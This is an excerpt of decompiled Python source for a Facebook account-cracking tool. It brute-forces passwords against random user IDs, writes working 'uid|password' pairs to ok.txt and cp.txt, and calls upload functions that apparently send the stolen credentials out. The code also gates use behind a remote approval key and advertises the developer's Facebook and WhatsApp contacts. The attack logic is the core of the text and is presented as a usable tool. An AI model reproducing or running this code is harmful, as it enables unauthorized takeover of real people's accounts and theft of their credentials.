# Decompile by : JAHID ISLAM 
# Time Succes decompile : 2022-25-08 00:21:42.178972 
...
def helpnote():
	print("%s [*] FOLLOW ME  :)"%(G))
	subprocess.check_output(["am", "start", "https://www.facebook.com/JAHID.ISLAM.MRx"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/JAHID.ISLAM.MRx")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +8801863656877")
	subprocess.check_output(["am", "start", "https://wa.me/+8801863656877"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/adriyanaditto543/jahid404-approval.txt.git').text
			if basesplit in plr:
				key = basesplit
				stat = ("\033[0;92mJAHID-KING")
				FY = '\033[0;93m'
				FG = '\033[0;92m'
				GET = '\r'
			else:
...
★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★
★> \033[0;92mDEVELOPER     : JAHID   
★> \033[0;95mFACEBOOK ID   : JAHID ISLAM  
★> \033[0;41mWHATSAPP      : +8801863656877   
★\033[0;96m> FACEBOOK       : JAHIDUL ISLAM 
...
★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★""")
		...
		print("★%s [%s2%s]%s CRACK RANDOM FB ID 2004-7 %s(PRO) V1"%(G,R,G,Y,G))
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX: Babu): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[+] [JAHID] : %s<==>%s -> \033[0;92m [ JAHID-OK:%s ]- \033[0;93m[JAHID-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [JAHID-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[JAHID-CP😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [JAHID-CP😭] %s|%s\-"%(uid, pw))
				uploadcps()
				break
			else:
				continue
